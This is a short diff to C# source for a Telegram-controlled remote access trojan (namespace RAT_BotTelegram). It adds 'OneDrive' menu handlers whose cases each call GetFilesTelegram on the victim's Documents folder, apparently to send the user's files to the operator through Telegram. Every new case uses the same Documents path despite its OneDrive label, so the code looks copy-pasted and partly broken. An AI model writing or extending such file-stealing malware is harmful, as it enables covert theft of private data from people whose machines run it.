@@ -325,7 +325,7 @@ namespace RAT_BotTelegram {
             var callbackQuery = callbackQueryEventArgs.CallbackQuery;
 
             switch (callbackQuery.Data) {
-
+                // User
                 case "GetPictures":
                     GetFilesTelegram(@"C:\Users\" + Features.getUserName() + @"\Documents");
                     break;
@@ -345,7 +345,24 @@ namespace RAT_BotTelegram {
                     GetFilesTelegram(@"C:\Users\" + Features.getUserName() + @"\Documents");
                     break;
 
+                // OneDrive
 
+                case "GetPicturesO":
+                    GetFilesTelegram(@"C:\Users\" + Features.getUserName() + @"\Documents");
+                    break;
+                case "GetVideosO":
+                    GetFilesTelegram(@"C:\Users\" + Features.getUserName() + @"\Documents");
+                    break;
+                case "GetDocumentO":
+                    GetFilesTelegram(@"C:\Users\" + Features.getUserName() + @"\Documents");
+                    break;
+                case "GetMusicO":
+                    GetFilesTelegram(@"C:\Users\" + Features.getUserName() + @"\Documents");
+                    break;
+                case "GetgetAllO":
+                    GetFilesTelegram(@"C:\Users\" + Features.getUserName() + @"\Documents");
+                    break;
+               // Other
 
 
 
